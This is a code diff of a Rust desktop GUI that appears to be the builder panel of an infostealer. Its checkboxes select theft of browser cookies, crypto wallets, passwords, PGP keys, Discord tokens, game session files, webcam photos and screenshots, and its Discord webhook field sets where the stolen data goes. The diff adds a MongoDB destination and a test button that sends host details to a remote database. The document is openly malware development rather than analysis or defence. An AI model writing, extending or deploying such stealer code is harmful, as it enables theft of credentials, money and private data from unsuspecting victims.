@@ -1,14 +1,13 @@
 use iced::{
-    Element, application,
-    wgpu::naga::valid::Uniformity,
+    Element, Theme, application,
     widget::{button, checkbox, column, container, row, text, text_input},
 };
 use tokio::runtime::{Builder, Runtime};
 
-use crate::utils::webhook::EmbedFooter;
 use crate::utils::webhook::EmbedThumbnail;
 use crate::utils::webhook::WebhookField;
 use crate::utils::{grab, webhook::Embed};
+use crate::utils::{grab::get_host, webhook::EmbedFooter};
 
 mod utils;
 
@@ -25,6 +24,9 @@ struct App {
     discord_token: bool,
     minecraft_ssid: bool,
     growtopia_save_dat: bool,
+
+    mongodb: bool,
+    mongodb_uri: String,
 }
 
 #[derive(Debug, Clone)]
@@ -40,6 +42,9 @@ enum Message {
     ToggleDiscordToken(bool),
     ToggleMinecraftSsid(bool),
     ToggleGrowtopiaSaveDat(bool),
+    ToggleMongoDB(bool),
+    ChangeMongoDBUri(String),
+    SendMongo,
     SendWebhook,
 }
 
@@ -78,6 +83,12 @@ impl App {
             }
             Message::ToggleGrowtopiaSaveDat(toggle) => {
                 self.growtopia_save_dat = toggle;
+            }
+            Message::ToggleMongoDB(toggle) => {
+                self.mongodb = toggle;
+            }
+            Message::ChangeMongoDBUri(uri) => {
+                self.mongodb_uri = uri;
             }
             Message::SendWebhook => {
                 if let Some(uri) = &self.webhook_uri {
@@ -166,6 +177,24 @@ impl App {
                     })
                 }
             }
+            Message::SendMongo => {
+                let rt = tokio::runtime::Runtime::new().unwrap();
+                rt.block_on(utils::mongodb::insert(
+                    &self.mongodb_uri.as_str(),
+                    Some(format!("{:?}", grab::get_host()).as_str()),
+                    None,
+                    None,
+                    None,
+                    None,
+                    None,
+                    None,
+                    None,
+                    None,
+                    None,
+                    None,
+                    None,
+                ));
+            }
         }
     }
 
@@ -174,50 +203,87 @@ impl App {
             column![
                 checkbox(self.browser_cookies)
                     .label("Browser Cookies")
+                    .text_size(12.0)
                     .on_toggle(Message::ToggleBrowserCookies),
                 checkbox(self.crypto_wallets)
                     .label("Crypto Wallets")
+                    .text_size(12.0)
                     .on_toggle(Message::ToggleCryptoWallets),
                 checkbox(self.txt_files)
                     .label("Txt Files")
+                    .text_size(12.0)
                     .on_toggle(Message::ToggleTxtFiles),
                 checkbox(self.passwords)
                     .label("Passwords")
+                    .text_size(12.0)
                     .on_toggle(Message::TogglePasswords),
-            ],
+                checkbox(self.mongodb)
+                    .label("MongoDB")
+                    .text_size(12.0)
+                    .on_toggle(Message::ToggleMongoDB),
+                if self.mongodb {
+                    text_input("MongoDB URI", self.mongodb_uri.as_str())
+                        .on_input(Message::ChangeMongoDBUri)
+                        .width(170.0)
+                        .size(12.0)
+                        .into()
+                } else {
+                    let e: Element<'_, Message> =
+                        text("MongoDB URI is not enabled").size(12.0).into();
+                    e
+                },
+            ]
+            .spacing(10.0),
             column![
                 checkbox(self.pgp_keys)
                     .label("Pgp Keys")
+                    .text_size(12.0)
                     .on_toggle(Message::TogglePgpKeys),
                 checkbox(self.webcam_photo)
                     .label("Webcam Photo")
+                    .text_size(12.0)
                     .on_toggle(Message::ToggleWebcamPhoto),
                 checkbox(self.screenshot_desktop)
                     .label("Screenshot Desktop")
+                    .text_size(12.0)
                     .on_toggle(Message::ToggleScreenshotDesktop),
                 checkbox(self.discord_token)
                     .label("Discord Token")
+                    .text_size(12.0)
                     .on_toggle(Message::ToggleDiscordToken),
-            ],
-            checkbox(self.minecraft_ssid)
-                .label("Minecraft Ssid")
-                .on_toggle(Message::ToggleMinecraftSsid),
-            checkbox(self.growtopia_save_dat)
-                .label("Growtopia Save Dat")
-                .on_toggle(Message::ToggleGrowtopiaSaveDat),
-            text_input(
-                "Discord Webhook URL",
-                self.webhook_uri.as_deref().unwrap_or("")
-            )
-            .on_input(Message::ChangeWebhookUri),
-            button("Test Hook").on_press(Message::SendWebhook)
+            ]
+            .spacing(10.0),
+            column![
+                checkbox(self.minecraft_ssid)
+                    .label("Minecraft Ssid")
+                    .text_size(12.0)
+                    .on_toggle(Message::ToggleMinecraftSsid),
+                checkbox(self.growtopia_save_dat)
+                    .label("Growtopia Save Dat")
+                    .text_size(12.0)
+                    .on_toggle(Message::ToggleGrowtopiaSaveDat),
+                text_input(
+                    "Discord Webhook URL",
+                    self.webhook_uri.as_deref().unwrap_or("")
+                )
+                .on_input(Message::ChangeWebhookUri)
+                .width(200.0)
+                .size(12.0),
+                button("Test Hook").on_press(Message::SendWebhook),
+                button("Test MongoDB").on_press(Message::SendMongo),
+            ]
+            .spacing(10.0),
         ]
-        .padding(20.0);
+        .padding(20.0)
+        .spacing(10.0);
 
         container(row).into()
     }
 }
 
 fn main() -> iced::Result {
-    application(|| App::default(), App::update, App::view).run()
+    application(|| App::default(), App::update, App::view)
+        .window_size((500.0, 300.0))
+        .theme(|app: &App| Theme::Oxocarbon)
+        .run()
 }
